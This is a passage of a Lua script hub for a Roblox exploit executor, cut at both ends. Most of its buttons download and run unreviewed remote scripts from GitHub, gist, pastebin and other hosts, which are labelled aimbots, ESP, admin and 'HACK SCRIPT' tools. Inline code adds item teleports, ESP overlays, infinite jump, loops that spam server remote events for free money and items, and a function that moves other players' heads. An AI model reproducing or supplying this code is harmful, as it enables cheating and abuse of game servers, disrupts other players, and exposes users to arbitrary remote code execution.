UniversalSection:NewButton("Auto Grammar", "Idk Why U Need This But Its Cool IG?", function()
    shared.CustomCorrections = {
        ["examplething12"] = "hello" -- if you say "examplething12" it will become hello
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eosuwu/boblox/main/autogremer.lua"))()
end)

UniversalSection:NewButton("Universal Hub", "One Of The Best UIS I Have ever Seen", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
end)


local Credits = Window:NewTab("Credits")
local CreditsSection = Credits:NewSection("Credits")

CreditsSection:NewTextBox("Not_zentical#4847", "No One Else Except the script owners", function(txt)
    print(txt)
end)
 
local Tab = Window:NewTab("Creators")
 
local Section = Tab:NewSection("Developer: TheMeetly#0885")

local Section = Tab:NewSection("Beta tester: TheMeetly#0885")

local Section = Tab:NewSection("ideas: TheMeetly#0885")
end)

Section:NewButton("Bed Wars (vape 4)", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

Section:NewButton("Piggy (tp to item)", "-", function()
wait()
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.StarterGui

local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)




local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.CoreGui

local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)

local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
UIGridLayout.CellSize = UDim2.new(0,90,0,90)

while wait(1) do
local a = workspace:getDescendants()
local items = {}
local itemframes = ScrollingFrame:getChildren()
for i=1,#itemframes do
if itemframes[i].ClassName == "TextButton" then
itemframes[i]:remove()
end
end
for i=1,#a do
if a[i].Name == "ItemPickupScript" and a[i].Parent:findFirstChild("ClickDetector") then
table.insert(items, a[i].Parent)
end
end
for i=1,#items do
local ItemFrame = Instance.new("TextButton", ScrollingFrame)
ItemFrame.Name = "ItemFrame"
ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ItemFrame.BackgroundTransparency = 0.95
ItemFrame.Size = UDim2.new(0, 100, 0, 100)
ItemFrame.Text = ""
local View = Instance.new("ViewportFrame", ItemFrame)
View.Name = "View"
View.Size = UDim2.new(1,0,1,0)
View.BackgroundTransparency = 1
View.BorderSizePixel = 0
local object = items[i]
local viewportclone = object:Clone()
viewportclone.Parent = View
local cam = Instance.new("Camera", viewportclone)
cam.CameraType = Enum.CameraType.Fixed
local objectPosition = object.Position
local cameraPosition = objectPosition + Vector3.new(0,3,0)
cam.CoordinateFrame = CFrame.new(cameraPosition, objectPosition)
View.CurrentCamera = cam

ItemFrame.MouseButton1Down:connect(function()
if items[i]:findFirstChild("ClickDetector") then
local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.05)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = items[i].CFrame
wait(0.1)
fireclickdetector(items[i].ClickDetector)
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end
end)
end
end
end)

Section:NewButton("Lucky Blocks", "-", function()
wait()
--Best LuckyBlock script Join for more! https://discord.gg/v7PDxkhqWt
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "LUCKY BLOCKS Battlegrounds";
    Text = "Made by MaGiXx"; -- what the text says (ofc)
    Duration = 5;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Anti-Afk";
    Text = "Enabled!"; -- what the text says (ofc)
    Duration = 5;
})
 
local LuckyBlock = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local title = Instance.new("TextLabel")
local Frame_HUB = Instance.new("ImageLabel")
local HUB = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local LuckyBlock_2 = Instance.new("TextButton")
local SuperBlock = Instance.new("TextButton")
local GalaxyBlock = Instance.new("TextButton")
local RainbowBlock = Instance.new("TextButton")
local DiamondBlock = Instance.new("TextButton")
local CopyDiscordServer = Instance.new("TextButton")
local DiscordServer_box = Instance.new("TextBox")
local lable_discord = Instance.new("TextLabel")
local open_box = Instance.new("TextBox")
local toBox = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local close = Instance.new("ImageButton")
 
--Properties:
 
LuckyBlock.Name = "LuckyBlock"
LuckyBlock.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LuckyBlock.ResetOnSpawn = false
 
Frame.Name = "Frame"
Frame.Parent = LuckyBlock
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.304542094, 0, 0.326781332, 0)
Frame.Size = UDim2.new(0, 525, 0, 300)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(0, 0, 0)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.Active = true
Frame.Draggable = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Size = UDim2.new(0, 439, 0, 51)
title.Font = Enum.Font.SourceSans
title.Text = "LuckyBlock"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 28.000
 
Frame_HUB.Name = "Frame_HUB"
Frame_HUB.Parent = Frame
Frame_HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.BackgroundTransparency = 1.000
Frame_HUB.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.Position = UDim2.new(0.531428576, 0, 0.0277550742, 0)
Frame_HUB.Size = UDim2.new(0, 81, 0, 33)
Frame_HUB.Image = "rbxassetid://3570695787"
Frame_HUB.ImageColor3 = Color3.fromRGB(255, 170, 0)
Frame_HUB.ScaleType = Enum.ScaleType.Slice
Frame_HUB.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_HUB.SliceScale = 0.120
 
HUB.Name = "HUB"
HUB.Parent = Frame_HUB
HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUB.BackgroundTransparency = 1.000
HUB.Position = UDim2.new(0, 0, -0.00494801067, 0)
HUB.Size = UDim2.new(0, 81, 0, 33)
HUB.Font = Enum.Font.SourceSans
HUB.Text = "HUB"
HUB.TextColor3 = Color3.fromRGB(0, 0, 0)
HUB.TextScaled = true
HUB.TextSize = 14.000
HUB.TextWrapped = true
 
Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(-0.034285713, 0, 0.170000002, 0)
Main.Size = UDim2.new(0, 559, 0, 0)
 
LuckyBlock_2.Name = "LuckyBlock"
LuckyBlock_2.Parent = Frame
LuckyBlock_2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
LuckyBlock_2.BorderSizePixel = 0
LuckyBlock_2.Position = UDim2.new(0.0552380905, 0, 0.223333329, 0)
LuckyBlock_2.Selectable = false
LuckyBlock_2.Size = UDim2.new(0, 150, 0, 35)
LuckyBlock_2.AutoButtonColor = false
LuckyBlock_2.Font = Enum.Font.SourceSans
LuckyBlock_2.Text = "LuckyBlock"
LuckyBlock_2.TextColor3 = Color3.fromRGB(255, 255, 255)
LuckyBlock_2.TextSize = 28.000
 
SuperBlock.Name = "SuperBlock"
SuperBlock.Parent = Frame
SuperBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SuperBlock.BorderSizePixel = 0
SuperBlock.Position = UDim2.new(0.0552381277, 0, 0.383333325, 0)
SuperBlock.Selectable = false
SuperBlock.Size = UDim2.new(0, 150, 0, 35)
SuperBlock.AutoButtonColor = false
SuperBlock.Font = Enum.Font.SourceSans
SuperBlock.Text = "SuperBlock"
SuperBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
SuperBlock.TextSize = 28.000
 
GalaxyBlock.Name = "GalaxyBlock"
GalaxyBlock.Parent = Frame
GalaxyBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
GalaxyBlock.BorderSizePixel = 0
GalaxyBlock.Position = UDim2.new(0.0552381277, 0, 0.826666653, 0)
GalaxyBlock.Selectable = false
GalaxyBlock.Size = UDim2.new(0, 150, 0, 35)
GalaxyBlock.AutoButtonColor = false
GalaxyBlock.Font = Enum.Font.SourceSans
GalaxyBlock.Text = "GalaxyBlock"
GalaxyBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GalaxyBlock.TextSize = 28.000
 
RainbowBlock.Name = "RainbowBlock"
RainbowBlock.Parent = Frame
RainbowBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
RainbowBlock.BorderSizePixel = 0
RainbowBlock.Position = UDim2.new(0.0552381277, 0, 0.679999948, 0)
RainbowBlock.Selectable = false
RainbowBlock.Size = UDim2.new(0, 150, 0, 35)
RainbowBlock.AutoButtonColor = false
RainbowBlock.Font = Enum.Font.SourceSans
RainbowBlock.Text = "RainbowBlock"
RainbowBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
RainbowBlock.TextSize = 28.000
 
DiamondBlock.Name = "DiamondBlock"
DiamondBlock.Parent = Frame
DiamondBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
DiamondBlock.BorderSizePixel = 0
DiamondBlock.Position = UDim2.new(0.0552381277, 0, 0.533333302, 0)
DiamondBlock.Selectable = false
DiamondBlock.Size = UDim2.new(0, 150, 0, 35)
DiamondBlock.AutoButtonColor = false
DiamondBlock.Font = Enum.Font.SourceSans
DiamondBlock.Text = "DiamondBlock"
DiamondBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
DiamondBlock.TextSize = 28.000
 
CopyDiscordServer.Name = "CopyDiscordServer"
CopyDiscordServer.Parent = Frame
CopyDiscordServer.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
CopyDiscordServer.BorderSizePixel = 0
CopyDiscordServer.Position = UDim2.new(0.531428576, 0, 0.826666713, 0)
CopyDiscordServer.Selectable = false
CopyDiscordServer.Size = UDim2.new(0, 194, 0, 35)
CopyDiscordServer.AutoButtonColor = false
CopyDiscordServer.Font = Enum.Font.SourceSans
CopyDiscordServer.Text = "CopyDiscordServer"
CopyDiscordServer.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyDiscordServer.TextSize = 28.000
 
DiscordServer_box.Name = "DiscordServer_box"
DiscordServer_box.Parent = Frame
DiscordServer_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DiscordServer_box.BorderSizePixel = 0
DiscordServer_box.Position = UDim2.new(0.531428576, 0, 0.709999979, 0)
DiscordServer_box.Size = UDim2.new(0, 194, 0, 35)
DiscordServer_box.ClearTextOnFocus = false
DiscordServer_box.Font = Enum.Font.SourceSans
DiscordServer_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.PlaceholderText = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.Text = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.TextSize = 14.000
 
lable_discord.Name = "lable_discord"
lable_discord.Parent = Frame
lable_discord.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lable_discord.BackgroundTransparency = 1.000
lable_discord.Position = UDim2.new(0.531428576, 0, 0.533333361, 0)
lable_discord.Size = UDim2.new(0, 194, 0, 53)
lable_discord.Font = Enum.Font.SourceSans
lable_discord.Text = "--You will find many other scripts in this discord server."
lable_discord.TextColor3 = Color3.fromRGB(0, 170, 0)
lable_discord.TextScaled = true
lable_discord.TextSize = 28.000
lable_discord.TextWrapped = true
 
open_box.Name = "open_box"
open_box.Parent = Frame
open_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
open_box.BorderSizePixel = 0
open_box.Position = UDim2.new(0.750476241, 0, 0.313333333, 0)
open_box.Size = UDim2.new(0, 56, 0, 35)
open_box.ClearTextOnFocus = false
open_box.Font = Enum.Font.SourceSans
open_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
open_box.PlaceholderText = "Value"
open_box.Text = "1"
open_box.TextColor3 = Color3.fromRGB(255, 255, 255)
open_box.TextSize = 28.000
open_box.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
toBox.Name = "toBox"
toBox.Parent = Frame
toBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toBox.BackgroundTransparency = 1.000
toBox.Position = UDim2.new(0.531428635, 0, 0.286666691, 0)
toBox.Size = UDim2.new(0, 194, 0, 50)
toBox.Font = Enum.Font.SourceSans
toBox.Text = "0 to "
toBox.TextColor3 = Color3.fromRGB(255, 255, 255)
toBox.TextSize = 28.000
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.Position = UDim2.new(0.400000006, 0, 0.170000002, 0)
Frame_2.Size = UDim2.new(0, 0, 0, 292)
 
close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.90054822, 0, 0.00678133965, 0)
close.Size = UDim2.new(0, 45, 0, 45)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)
 
 
----------------------------------------------------------------
 
close.MouseButton1Click:connect(function()
    Frame.Visible = false
end)
 
LuckyBlock_2.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
    end
end)
 
DiamondBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
    end
end)
 
SuperBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnSuperBlock:FireServer()
    end
end)
 
RainbowBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
    end
end)
 
GalaxyBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
    end
end)
 
CopyDiscordServer.MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/TyUzMpMMUE")
    wait(1)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Success!";
        Text = "Copy Discord: https://discord.gg/v7PDxkhqWt"; -- what the text says (ofc)
        Duration = 5;
    })
end)
end)
 
Section:NewButton("Combat Warrios", "-", function()
wait()
--Fixed loading issue
--Also Fixed performance issue when executing
loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
end)

Section:NewButton("MM2 (v2) (long loading)", "fly,esp,noclip.", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
end)

Section:NewButton("MM2 knife changer", "-", function()
wait()
loadstring(game:HttpGet("https://gist.githubusercontent.com/HeckerX567/dc9aa6e247cce03dadb2cc50b41d60c9/raw/3e8bc0346245ca5512523b97c6aa680be8fbe630/gistfile1.txt"))()
end)

Section:NewButton("The Rake REMASTERED", "gui", function()
wait()
loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
end)

Section:NewButton("Prison life", "admin to prison life", function()
wait()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
end)

Section:NewButton("scp 3008 gui", "gui", function()
wait()
loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
end)

Section:NewButton("BIG Paintball (key)", "aim bot and more", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0xd5f/CERBERUS/main/CERBERUS.lua", true))()
end)

Section:NewButton("Inf Jumps, ESP, Tp Head", "Inf Jumps, ESP, Tp Head", function()
wait()
local SilentAssassinV1 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Inf = Instance.new("TextButton")
local Border = Instance.new("TextLabel")
local Border_2 = Instance.new("TextLabel")
local Tp = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local Open = Instance.new("TextButton")
 
SilentAssassinV1.Name = "SilentAssassinV1"
SilentAssassinV1.Parent = game.CoreGui
 
Main.Name = "Main"
Main.Parent = SilentAssassinV1
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.new(1, 1, 1)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.439999998, 0, -0.379999995, 0)
Main.Size = UDim2.new(0, 313, 0, 226)
Main.Style = Enum.FrameStyle.RobloxRound
 
Inf.Name = "Inf"
Inf.Parent = Main
Inf.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Inf.Position = UDim2.new(0.293356001, 0, 0.369042367, 0)
Inf.Size = UDim2.new(0, 121, 0, 30)
Inf.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Inf.Font = Enum.Font.SciFi
Inf.Text = "Inf Jump"
Inf.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Inf.TextSize = 16
Inf.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Border.Name = "Border"
Border.Parent = Main
Border.BackgroundColor3 = Color3.new(0.376471, 0.698039, 1)
Border.BorderSizePixel = 0
Border.Position = UDim2.new(-0.0278844871, 0, 0.163740993, 0)
Border.Size = UDim2.new(0, 313, 0, 8)
Border.SizeConstraint = Enum.SizeConstraint.RelativeXX
Border.Font = Enum.Font.SourceSans
Border.Text = ""
Border.TextColor3 = Color3.new(0, 0, 0)
Border.TextSize = 14
 
Border_2.Name = "Border"
Border_2.Parent = Main
Border_2.BackgroundColor3 = Color3.new(0.376471, 0.698039, 1)
Border_2.BorderSizePixel = 0
Border_2.Position = UDim2.new(-0.0283860359, 0, -0.0413680971, 0)
Border_2.Size = UDim2.new(0, 313, 0, 8)
Border_2.SizeConstraint = Enum.SizeConstraint.RelativeXX
Border_2.Font = Enum.Font.SourceSans
Border_2.Text = ""
Border_2.TextColor3 = Color3.new(0, 0, 0)
Border_2.TextSize = 14
 
Tp.Name = "Tp"
Tp.Parent = Main
Tp.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Tp.Position = UDim2.new(0.290669143, 0, 0.738794327, 0)
Tp.Size = UDim2.new(0, 121, 0, 30)
Tp.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Tp.Font = Enum.Font.SciFi
Tp.Text = "Tp Players Head"
Tp.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Tp.TextSize = 16
Tp.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.161489859, 0, 0.0452267826, 0)
Title.Size = UDim2.new(0, 200, 0, 16)
Title.Font = Enum.Font.SciFi
Title.Text = "Silent Assassin V1"
Title.TextColor3 = Color3.new(0.819608, 0.819608, 0.819608)
Title.TextSize = 23
 
Close.Name = "Close"
Close.Parent = Main
Close.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Close.BackgroundTransparency = 1
Close.BorderSizePixel = 0
Close.Position = UDim2.new(-0.0285393968, 0, 0.891390383, 0)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Font = Enum.Font.SciFi
Close.Text = "X"
Close.TextColor3 = Color3.new(0.74902, 0, 0)
Close.TextSize = 16
Close.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Esp.Name = "Esp"
Esp.Parent = Main
Esp.BackgroundColor3 = Color3.new(0.266667, 0.611765, 0.705882)
Esp.Position = UDim2.new(0.289959162, 0, 0.553506851, 0)
Esp.Size = UDim2.new(0, 121, 0, 30)
Esp.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Esp.Font = Enum.Font.SciFi
Esp.Text = "Esp"
Esp.TextColor3 = Color3.new(0.227451, 0.329412, 0.423529)
Esp.TextSize = 16
Esp.TextStrokeColor3 = Color3.new(0.227451, 0.329412, 0.423529)
 
Open.Name = "Open"
Open.Parent = SilentAssassinV1
Open.BackgroundColor3 = Color3.new(1, 1, 1)
Open.Position = UDim2.new(0, 0, 0.761627853, 0)
Open.Size = UDim2.new(0, 174, 0, 43)
Open.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
Open.Font = Enum.Font.SciFi
Open.Text = "Open Main"
Open.TextColor3 = Color3.new(0.215686, 0.443137, 0.619608)
Open.TextSize = 28
 
--Making Script--
 
--Open Animation--
 
Open.MouseButton1Click:connect(function()
    Main:TweenPosition(UDim2.new(0.44, 0,0.38, 0), 'In', 'Bounce', 1, true)
    Open.Visible = false
end)
 
--Close Animation--
 
Close.MouseButton1Click:connect(function()
    Main:TweenPosition(UDim2.new(0.44, 0,-0.38, 0), 'Out', 'Bounce', 1, true)
    Open.Visible = true
end)
 
--Tp Head--
 
Tp.MouseButton1Click:connect(function()
for i,v in pairs(game.Players:GetChildren()) do
if v.Name ~= game.Players.LocalPlayer.Name then
v.Character.Head.Anchored = true
v.Character.Head.CFrame = game.Players.LocalPlayer.Character.Head.CFrame*CFrame.new(0,0,-5)
end
end
end)
 
--Inf Jumps--
 
Inf.MouseButton1Click:connect(function()
local plr = game:GetService"Players".LocalPlayer
game:GetService("UserInputService").JumpRequest:connect(function()
game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
end)
end)
 
--Esp--
 
Esp.MouseButton1Click:connect(function()
wait(0.5)
 
plrs = nil
for _,p in pairs(game:GetChildren()) do
   if p.ClassName == ("Players") then
   plrs = p
   end
end
 
 
while true do
wait(0.1)
for _, v in pairs(plrs:GetChildren()) do
if v.TeamColor ~= plrs.LocalPlayer.TeamColor and not v.Character.Head:FindFirstChild("BillboardGui") then --   ~=
i = Instance.new("BillboardGui",v.Character.Head)
i.Active = true
i.AlwaysOnTop = true
i.Size = UDim2.new(1,0,1,0)
h = Instance.new("Frame",i)
h.Size = UDim2.new(2,0,1,0)
h.AnchorPoint = Vector2.new(0.25, 0)
h.BackgroundColor3 = Color3.new(1,0,0)
h.BorderSizePixel = 0
h.BackgroundTransparency = 0.4
 
i2 = Instance.new("BillboardGui",v.Character.Torso)
i2.Active = true
i2.AlwaysOnTop = true
i2.Size = UDim2.new(2,0,2,0)
t = Instance.new("Frame",i2)
t.Size = UDim2.new(1,0,1,0)
t.AnchorPoint = Vector2.new(0, 0)
t.BackgroundColor3 = Color3.new(0,1,0)
t.BorderSizePixel = 0
t.BackgroundTransparency = 0.4
 
i3 = Instance.new("BillboardGui",v.Character["Left Arm"])
i3.Active = true
i3.AlwaysOnTop = true
i3.Size = UDim2.new(1,0,2,0)
la = Instance.new("Frame",i3)
la.Size = UDim2.new(1,0,1,0)
la.AnchorPoint = Vector2.new(0, 0)
la.BackgroundColor3 = Color3.new(0,0,1)
la.BorderSizePixel = 0
la.BackgroundTransparency = 0.4
 
i4 = Instance.new("BillboardGui",v.Character["Right Arm"])
i4.Active = true
i4.AlwaysOnTop = true
i4.Size = UDim2.new(1,0,2,0)
ra = Instance.new("Frame",i4)
ra.Size = UDim2.new(1,0,1,0)
ra.AnchorPoint = Vector2.new(0, 0)
ra.BackgroundColor3 = Color3.new(0,0,1)
ra.BorderSizePixel = 0
ra.BackgroundTransparency = 0.4
 
i5 = Instance.new("BillboardGui",v.Character["Left Leg"])
i5.Active = true
i5.AlwaysOnTop = true
i5.Size = UDim2.new(1,0,2,0)
ll = Instance.new("Frame",i5)
ll.Size = UDim2.new(1,0,1,0)
ll.AnchorPoint = Vector2.new(0, 0)
ll.BackgroundColor3 = Color3.new(0,0,1)
ll.BorderSizePixel = 0
ll.BackgroundTransparency = 0.4
 
i6 = Instance.new("BillboardGui",v.Character["Right Leg"])
i6.Active = true
i6.AlwaysOnTop = true
i6.Size = UDim2.new(1,0,2,0)
rl = Instance.new("Frame",i6)
rl.Size = UDim2.new(1,0,1,0)
rl.AnchorPoint = Vector2.new(0, 0)
rl.BackgroundColor3 = Color3.new(0,0,1)
rl.BorderSizePixel = 0
rl.BackgroundTransparency = 0.4
 
end
end
end
end)
 
--End Of The Script--
end)
 
Section:NewButton("DOORS (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectLightningDev/Project-Lightning-Loader/main/Loader.Lua"))()
end)

Section:NewButton("DA HOOD", "gui", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
end)

Section:NewButton("Counter Blox", "By Robojini", function()
wait()
loadstring(game:HttpGet('https://pastebin.com/raw/8cSuaFj1',true))();
end)

Section:NewButton("Zombie Attack", "gui", function()
wait()
loadstring(game:HttpGet"https://raw.githubusercontent.com/WinterDinder/zombiettackfixed/main/zombo")()
end)

Section:NewButton("Specter 2", "my favorite game)", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
end)

Section:NewButton("Apeirophobia (key)", "gui", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
end)

Section:NewButton("Horrific Hоusing (inf money)", "-", function()
wait()
while true do
wait(0)
local Target = game:GetService("ReplicatedStorage").LoginRewards;
Target:FireServer();
end
end)
 
Section:NewButton("JailBreak", "Script to JailBreak", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()
end)
 
Section:NewButton("Build a boat for Treasure  (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet('http://acehub.pro/api/whitelist'))()
end)
 
Section:NewButton("Breaking Point", "aim bot", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tkorra/bp-gui/main/main.lua'))()
end)
 
Section:NewButton("MAD CITY", "HACK SCRIPT", function()
wait()
loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/811e25ec8cfcdaa9ae7026353288783c/raw/4b073a5c1a0a4e2ed7e2304c2e769eb440a371a9/h", true))()
end)

Section:NewButton("MAD CITY 2 (Recommended) (key)", "HACK SCRIPT2", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/mad-city/main/Protected%20(25).lua"))()
end)

Section:NewButton("SharkBite 2 (key)", "the key of the script in the discord", function()
wait()
loadstring(game:HttpGet('https://factshub.vercel.app'))()
end)
 
local Tab = Window:NewTab("TOP SCRIPT!")
 
local Section = Tab:NewSection("TOP SCRIPTS by meetly")
 
Section:NewButton("TP to player", "you can not write a full nickname", function()
wait()
loadstring(game:HttpGet(("https://pastebin.com/raw/YNVbeqPy")))()
end)

local Tab = Window:NewTab("Visual/Render")
 
 local Section = Tab:NewSection("Visual Hack to Player")

 Section:NewButton("KeyStrokes", "-", function()
wait()
getgenv().k1 = "W"
getgenv().k2 = "A"
getgenv().k3 =  "S"
getgenv().k4 = "D"

getgenv().backdrop = false -- only if you want the shadow bg.
getgenv().showms = true -- only if you want to have your ms shown.
getgenv().showfps = true -- only if you want to have your fps shown.
getgenv().showkps = true -- only if you want to have your kps shown.
getgenv().animated = true -- only if you want the GUI to have the animated shadow.
getgenv().showarrows = false -- only if you want arrow keys to be shown.
getgenv().keydrag = false -- only if you want the keys to be draggable, can also be buggy, will be worked on in the future.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Zirmith/Util-Tools/main/keyStrokes.lua"))()

end)
 
Section:NewButton("FB (fullbright)", "fullbright", function()
wait()
pcall(function()
    local lighting = game:GetService("Lighting");
    lighting.Ambient = Color3.fromRGB(255, 255, 255);
    lighting.Brightness = 1;
    lighting.FogEnd = 1e10;
    for i, v in pairs(lighting:GetDescendants()) do
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = false;
        end;
    end;
    lighting.Changed:Connect(function()
        lighting.Ambient = Color3.fromRGB(255, 255, 255);
        lighting.Brightness = 1;
        lighting.FogEnd = 1e10;
    end);
    spawn(function()
        local character = game:GetService("Players").LocalPlayer.Character;
        while wait() do
            repeat wait() until character ~= nil;
            if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
                local headlight = Instance.new("PointLight", character.HumanoidRootPart);
                headlight.Brightness = 1;
                headlight.Range = 60;
            end;
        end;
    end);
end)
end)

Section:NewButton("free-cam", "toggel shift + p", function()
